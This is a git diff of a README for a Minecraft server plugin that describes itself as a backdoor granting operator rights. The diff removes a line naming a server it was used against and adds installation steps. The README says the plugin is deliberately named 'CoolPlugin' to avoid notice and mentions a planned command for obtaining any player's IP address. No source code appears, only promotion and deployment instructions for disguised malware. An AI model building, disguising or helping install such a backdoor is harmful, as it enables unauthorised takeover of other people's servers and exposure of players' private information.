@@ -1,6 +1,5 @@
 # MINECRAFT BACKDOOR PLUGIN
 A force op or backdoor minecraft plugin which can be used to get OP on a minecraft server
-used to backdoor csmp(a larp anarchy server)
 
 Commands-
 
@@ -16,3 +15,9 @@ Currently im working on a ip command where you can get ip of any player on the s
 
 Its also named CoolPlugin to dont make it stand out more lol
 
+# HOW DO I USE IT?!??!
+
+Put the .jar file to the plugins folder of the server 
+If your trying to build from source then make sure to add spigot-api jar file as a depedency 
+here is the api link-
+https://hub.spigotmc.org/nexus/content/repositories/snapshots/org/spigotmc/spigot-api/
